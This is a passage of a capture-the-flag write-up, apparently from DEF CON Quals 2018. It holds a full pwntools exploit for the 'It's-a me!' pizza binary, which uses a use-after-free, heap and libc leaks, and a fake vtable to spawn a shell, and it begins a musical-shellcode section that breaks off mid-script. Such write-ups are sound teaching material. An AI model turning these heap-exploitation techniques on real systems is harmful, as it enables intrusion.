</span></span></code></pre></div><p>Flag: <code>dark logic</code></p><h2 class="relative group">It&rsquo;s-a me!<div id=its-a-me class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#its-a-me aria-label=Anchor>#</a></span></h2><p>We&rsquo;re given an x64 Linux ELF, written in C++, with full RELRO, stack canaries, NX, and PIE. We can create users, order and cook pizzas and so on. To order pizzas, ingredients are specified using UTF-8 sequences. When cooking pizzas, we can specify an explanation, which will be allocated on the heap (with a dynamic size depending on the input size).</p><p>We notice that it is apparently impossible to order a pineapple pizza (sequence <code>\xf0\x9f\x8d\x8d</code>). However, we can order a pizza with ingredients <code>\xf0\xf0\xf0\x9f</code> and <code>\x8d\x8d</code>, which are valid sequences and will be concantenated when cooking, creating the pineapple ingredient. After cooking a pineapple pizza, Mario gets mad at us. We can log out, or edit our explanation (which logs us out afterwards). From the logged out menu, we can see the explanation we gave.</p><p>There is a use-after-free here. When cooking, if we carefully set up an order (e.g., 16 pineapple pizzas and 1 tomato pizza), we can make the program free the explanation buffer while keeping a pointer to it for editing and printing. Also, the editing size is fixed (300), while the actual size of the once-allocated explanation can vary, so there&rsquo;s an overflow, too (we didn&rsquo;t use it).</p><p>We first print out a freed explanation unsorted bin to leak the heap (there&rsquo;s another freed unsorted due to vector resizing). Then, we edit an unsorted bin&rsquo;s links to write <code>main_arena</code> into the explanation itself at the next <code>malloc</code>. By printing the explanation, we leak libc. Finally, we allocate and free an explanation with the same size as a pizza object, then get a pizza allocated in that free fastbin and leak the binary&rsquo;s base through the vtable pointer.</p><p>Then, we edit a fastbin-sized free explanation to link a fake fastbin in BSS, near the currently logged user pointer. After setting up a fake user and a bunch of related fake structures in buffers residing in BSS, we overwrite the current user with the fake one through the fake fastbin. Finally, the admire option in the user menu can be used to trigger a virtual method invocation on a fake pizza belonging to the fake user. The fake vtable of the pizza will call a onegadget, popping a shell.</p><p>Exploit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pow</span> <span class=kn>import</span> <span class=n>solve_pow</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;x86_64&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pow_connect</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Challenge: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>challenge</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;n: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Solving PoW (</span><span class=si>{}</span><span class=s1> </span><span class=si>{}</span><span class=s1>)&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sol</span> <span class=o>=</span> <span class=n>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;found </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>sol</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Solution: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>sol</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#context.log_level = &#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#p = process(&#39;./mario&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;83b1db91.quals2018.oooverflow.io&#39;</span><span class=p>,</span> <span class=mi>31337</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pow_connect</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>menu</span><span class=p>(</span><span class=n>choice</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Choice: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>choice</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># MAIN MENU</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>new_customer</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=s1>&#39;N&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;name? &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=s1>&#39;L&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;name? &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>why_upset</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=s1>&#39;W&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;say: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>niente scuse</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>tail</span><span class=p>)[:</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>tail</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># USER MENU</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>logout</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=s1>&#39;L&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>order</span><span class=p>(</span><span class=n>pizzas</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=s1>&#39;O&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;pizzas? &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>pizzas</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>pizza</span> <span class=ow>in</span> <span class=n>pizzas</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;ingredients? &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>pizza</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>pizza</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>cook</span><span class=p>(</span><span class=n>explanation</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=s1>&#39;C&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;explain: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>explanation</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>admire</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=s1>&#39;A&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>explain</span><span class=p>(</span><span class=n>explanation</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=s1>&#39;P&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;yourself: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>explanation</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>go_away</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=s1>&#39;Y&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>TOMATO</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=se>\xf0\x9f\x8d\x85</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>PINEAPPLE_PIZZA</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;</span><span class=se>\xf0\xf0\xf0\x9f</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x8d\x8d</span><span class=s1>&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>FREED_EXPLANATION_ORDER</span> <span class=o>=</span> <span class=p>[</span><span class=n>PINEAPPLE_PIZZA</span><span class=p>]</span> <span class=o>*</span> <span class=mi>16</span> <span class=o>+</span> <span class=p>[[</span><span class=n>TOMATO</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Leaking heap&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># leak fd from unsorted bin through UAF</span>
</span></span><span class=line><span class=cl><span class=c1># fd points to heap because the pizza vector reallocation freed</span>
</span></span><span class=line><span class=cl><span class=c1># a (now) unsorted chunk before us</span>
</span></span><span class=line><span class=cl><span class=n>new_customer</span><span class=p>(</span><span class=s1>&#39;heapleak&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>order</span><span class=p>(</span><span class=n>FREED_EXPLANATION_ORDER</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cook</span><span class=p>(</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>go_away</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>heap_leak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>why_upset</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;~ 0x</span><span class=si>{:012x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>heap_leak</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Leaking libc&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># corrupt an explanation&#39;s unsorted fd to &amp;explanation-0x10</span>
</span></span><span class=line><span class=cl><span class=n>new_customer</span><span class=p>(</span><span class=s1>&#39;libcleak&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>order</span><span class=p>(</span><span class=n>FREED_EXPLANATION_ORDER</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cook</span><span class=p>(</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>explain</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>heap_leak</span> <span class=o>+</span> <span class=mh>0x4b0</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)[:</span><span class=mi>6</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># allocate a chunk to write main_arena to *(fd+0x10) -&gt; explanation</span>
</span></span><span class=line><span class=cl><span class=n>new_customer</span><span class=p>(</span><span class=s1>&#39;unsorted&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>logout</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># leak main_arena through the explanation</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>why_upset</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x3c4c48</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;@ 0x</span><span class=si>{:012x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Leaking PIE &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># get a 0x40 free leakable explanation chunk</span>
</span></span><span class=line><span class=cl><span class=n>new_customer</span><span class=p>(</span><span class=s1>&#39;binleak&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>order</span><span class=p>(</span><span class=n>FREED_EXPLANATION_ORDER</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cook</span><span class=p>(</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=mh>0x37</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>go_away</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># allocate a bad pizza (0x40 chunk) over the explanation</span>
</span></span><span class=line><span class=cl><span class=n>new_customer</span><span class=p>(</span><span class=s1>&#39;badpizza&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>order</span><span class=p>([[</span><span class=s1>&#39;X&#39;</span><span class=p>]]</span> <span class=o>*</span> <span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cook</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>logout</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># leak the binary through the bad pizza&#39;s vtable ptr</span>
</span></span><span class=line><span class=cl><span class=n>bin_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>why_upset</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x20bbe0</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;@ 0x</span><span class=si>{:012x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>bin_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NAME_ADDR</span> <span class=o>=</span> <span class=n>bin_base</span> <span class=o>+</span> <span class=mh>0x20c5e0</span>
</span></span><span class=line><span class=cl><span class=n>EXPLANATION_ADDR</span> <span class=o>=</span> <span class=n>bin_base</span> <span class=o>+</span> <span class=mh>0x20c480</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Hijacking vtable&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># link a fake 0x20 fastbin just before the upset and logged user ptrs in BSS</span>
</span></span><span class=line><span class=cl><span class=n>FAKE_FAST_ADDR</span> <span class=o>=</span> <span class=n>EXPLANATION_ADDR</span> <span class=o>+</span> <span class=mh>0x120</span>
</span></span><span class=line><span class=cl><span class=n>new_customer</span><span class=p>(</span><span class=s1>&#39;fakefast&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>order</span><span class=p>(</span><span class=n>FREED_EXPLANATION_ORDER</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cook</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x128</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\x21</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>explain</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>FAKE_FAST_ADDR</span><span class=p>)[:</span><span class=mi>6</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># we lay out fake structures in the BSS name buffer</span>
</span></span><span class=line><span class=cl><span class=n>USER_ADDR</span> <span class=o>=</span> <span class=n>NAME_ADDR</span> <span class=o>+</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>PIZZA_PTR_ARRAY_ADDR</span> <span class=o>=</span> <span class=n>USER_ADDR</span> <span class=o>+</span> <span class=mh>0x48</span>
</span></span><span class=line><span class=cl><span class=n>PIZZA_ADDR</span> <span class=o>=</span> <span class=n>PIZZA_PTR_ARRAY_ADDR</span> <span class=o>+</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>VTABLE_ADDR</span> <span class=o>=</span> <span class=n>PIZZA_ADDR</span> <span class=o>+</span> <span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=c1># fake vtable for a pizza, calls onegadget from admire</span>
</span></span><span class=line><span class=cl><span class=n>ONE_GADGET</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x4526a</span>
</span></span><span class=line><span class=cl><span class=n>vtable</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ONE_GADGET</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># fake pizza, with our fake vtable</span>
</span></span><span class=line><span class=cl><span class=n>pizza</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>VTABLE_ADDR</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>16</span>
</span></span><span class=line><span class=cl><span class=c1># fake array of pizzas, with our fake pizza</span>
</span></span><span class=line><span class=cl><span class=n>pizza_ptr_array</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>PIZZA_ADDR</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># fake list for pizza_ptr_array</span>
</span></span><span class=line><span class=cl><span class=n>pizza_list</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>PIZZA_PTR_ARRAY_ADDR</span><span class=p>)</span>   <span class=c1># begin ptr</span>
</span></span><span class=line><span class=cl><span class=n>pizza_list</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>PIZZA_PTR_ARRAY_ADDR</span><span class=o>+</span><span class=mi>8</span><span class=p>)</span> <span class=c1># end ptr</span>
</span></span><span class=line><span class=cl><span class=n>pizza_list</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=c1># fake user, with pizza_list</span>
</span></span><span class=line><span class=cl><span class=n>user</span>  <span class=o>=</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>8</span><span class=o>+</span><span class=mh>0x18</span><span class=o>+</span><span class=mi>8</span><span class=p>)</span> <span class=c1># name, uncooked pizzas, explanation</span>
</span></span><span class=line><span class=cl><span class=n>user</span> <span class=o>+=</span> <span class=n>pizza_list</span>        <span class=c1># list of cooked pizzas</span>
</span></span><span class=line><span class=cl><span class=n>user</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>8</span>          <span class=c1># ensure invalid user flag = 0</span>
</span></span><span class=line><span class=cl><span class=c1># throw everything into the BSS name buffer</span>
</span></span><span class=line><span class=cl><span class=c1># strlen = 0 -&gt; waste an 0x20 fastbin, bringing our fake fastbin to head</span>
</span></span><span class=line><span class=cl><span class=n>new_customer</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>user</span> <span class=o>+</span> <span class=n>pizza_ptr_array</span> <span class=o>+</span> <span class=n>pizza</span> <span class=o>+</span> <span class=n>vtable</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># will allocate explanation on fake fastbin</span>
</span></span><span class=line><span class=cl><span class=c1># overwrite logged user ptr with fake user</span>
</span></span><span class=line><span class=cl><span class=n>cook</span><span class=p>(</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>USER_ADDR</span><span class=p>)[:</span><span class=mi>6</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># invoke onegadget via fake vtable</span>
</span></span><span class=line><span class=cl><span class=n>admire</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;pwned!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 class="relative group">Note Oriented Programming<div id=note-oriented-programming class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#note-oriented-programming aria-label=Anchor>#</a></span></h2><p>We had remote access to the challenge and we&rsquo;ve been provided with the executable <code>nop</code>.<br>We could only insert some integer values that after certain operations became strings representing notes and octaves. We could execute &rsquo;notes&rsquo; from <code>A0</code> to <code>G#8</code>.
Seems like we have to craft a musical shellcode!</p><h3 class="relative group">Reversing<div id=reversing class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#reversing aria-label=Anchor>#</a></span></h3><p>The program allocates two sections at <code>0x40404000</code>, and <code>0x60606000</code>:<br>It will store the user input in the first section -that we will call <code>USER_INPUT</code>- and a set of musical notes expressed in alphabetical notation in the latter -that we will call <code>CODE</code> as the program will jump to it to
play our song-.</p><pre tabindex=0><code>0x40404000 0x40405000 rw-p     1000 0
0x565a6000 0x565a7000 r-xp     1000 0      /home/mhackeroni/ctf/defconquals18/nop/nop                         
0x565a7000 0x565a8000 r--p     1000 0      /home/mhackeroni/ctf/defconquals18/nop/nop                         
0x565a8000 0x565a9000 rw-p     1000 1000   /home/mhackeroni/ctf/defconquals18/nop/nop                         
0x60606000 0x60608000 rwxp     2000 0
</code></pre><p>After reading the user input, it will starts processing it by reading a word at a time, and translate each word into the a set of notes (e.g., G#0, B7)
into the <code>CODE</code> section: the program will stop parsing notes at the first <code>\xff\xff</code>, but will stop reading our inputs at the first <code>\x00\x00</code>: an extremely
valuable <em>feature</em> allowing us to have an unconstrained user input at a specific location.</p><p>Before the shellcode, the program puts a small stub that cleans useful registers, and copies <code>ESP</code> in <code>ESI</code> and <code>EDI</code>. An <code>int 80</code> will be concatenated at the end of our code.</p><h3 class="relative group">Shellcoding<div id=shellcoding class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#shellcoding aria-label=Anchor>#</a></span></h3><p>Our first aim was to retrieve a list of all the instructions we could use. We combined several notes and disassembled them with capstone in order to have some useful &ldquo;gadget&rdquo; to build the shellcode.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>math</span> <span class=kn>import</span> <span class=n>log</span>             
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>defaultdict</span>                               
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>capstone</span> <span class=kn>import</span> <span class=o>*</span>           
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>                 
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>                        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fmin</span> <span class=o>=</span> <span class=mi>27</span>                        
</span></span><span class=line><span class=cl><span class=n>fmax</span> <span class=o>=</span> <span class=mi>26590</span>                     
</span></span><span class=line><span class=cl>
